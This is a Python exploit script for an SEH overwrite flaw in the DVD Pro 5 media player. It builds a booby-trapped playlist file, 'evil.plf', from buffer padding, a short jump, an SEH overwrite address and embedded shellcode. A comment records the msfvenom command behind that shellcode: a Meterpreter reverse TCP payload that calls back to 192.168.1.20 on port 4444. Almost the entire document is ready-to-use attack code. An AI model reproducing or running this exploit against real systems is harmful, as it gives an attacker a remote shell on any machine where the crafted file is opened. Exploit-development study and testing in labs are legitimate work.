#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the SEH overwrite vulnerability in DVD Pro 5. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.


#badchars = \x00\x0A\x1A

#Shellcode: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 -f python -b '\x00\x0A\x1A'

filename="evil.plf"

buf =  ""
buf += "\xbf\x97\xa1\xd9\x3f\xda\xcf\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x56\x83\xea\xfc\x31\x7a\x0f\x03\x7a\x98\x43"
buf += "\x2c\xc3\x4e\x01\xcf\x3c\x8e\x66\x59\xd9\xbf\xa6\x3d"
buf += "\xa9\xef\x16\x35\xff\x03\xdc\x1b\x14\x90\x90\xb3\x1b"
buf += "\x11\x1e\xe2\x12\xa2\x33\xd6\x35\x20\x4e\x0b\x96\x19"
buf += "\x81\x5e\xd7\x5e\xfc\x93\x85\x37\x8a\x06\x3a\x3c\xc6"
buf += "\x9a\xb1\x0e\xc6\x9a\x26\xc6\xe9\x8b\xf8\x5d\xb0\x0b"
buf += "\xfa\xb2\xc8\x05\xe4\xd7\xf5\xdc\x9f\x23\x81\xde\x49"
buf += "\x7a\x6a\x4c\xb4\xb3\x99\x8c\xf0\x73\x42\xfb\x08\x80"
buf += "\xff\xfc\xce\xfb\xdb\x89\xd4\x5b\xaf\x2a\x31\x5a\x7c"
buf += "\xac\xb2\x50\xc9\xba\x9d\x74\xcc\x6f\x96\x80\x45\x8e"
buf += "\x79\x01\x1d\xb5\x5d\x4a\xc5\xd4\xc4\x36\xa8\xe9\x17"
buf += "\x99\x15\x4c\x53\x37\x41\xfd\x3e\x5f\xa6\xcc\xc0\x9f"
buf += "\xa0\x47\xb2\xad\x6f\xfc\x5c\x9d\xf8\xda\x9b\x94\xef"
buf += "\xdc\x74\x1e\x7f\x23\x75\x5e\xa9\xe0\x21\x0e\xc1\xc1"
buf += "\x49\xc5\x11\xed\x9f\x73\x18\x79\xe0\x2b\x1d\x6d\x88"
buf += "\x29\x1e\x9c\x14\xa4\xf8\xce\xf4\xe6\x54\xaf\xa4\x46"
buf += "\x05\x47\xaf\x49\x7a\x77\xd0\x80\x13\x12\x3f\x7c\x4b"
buf += "\x8b\xa6\x25\x07\x2a\x26\xf0\x6d\x6c\xac\xf0\x92\x23"
buf += "\x45\x71\x81\x54\x32\x79\x59\xa5\xd7\x79\x33\xa1\x71"
buf += "\x2e\xab\xab\xa4\x18\x74\x53\x83\x1b\x73\xab\x52\x2d"
buf += "\x0f\x9a\xc0\x11\x67\xe3\x04\x91\x77\xb5\x4e\x91\x1f"
buf += "\x61\x2b\xc2\x3a\x6e\xe6\x77\x97\xfb\x09\x21\x4b\xab"
buf += "\x61\xcf\xb2\x9b\x2d\x30\x91\x9f\x2a\xce\x67\x88\x92"
buf += "\xa6\x97\x88\x22\x36\xf2\x08\x73\x5e\x09\x26\x7c\xae"
buf += "\xf2\xed\xd5\xa6\x79\x60\x97\x57\x7d\xa9\x79\xc9\x7e"
buf += "\x5e\xa2\xfa\x05\x2f\x55\xfb\xf9\x39\x32\xfc\xf9\x45"
buf += "\x44\xc1\x2f\x7c\x32\x04\xec\x3b\x4d\x33\x51\x6d\xc4"
buf += "\x3b\xc5\x6d\xcd"

buffer="A"*608 + "\xEB\x06\x90\x90" + "\x33\x42\x62\x61"+ buf + "\x90"*(2000-616-len(buf))

textfile = open(filename,'w')
textfile.write(buffer)
textfile.close()

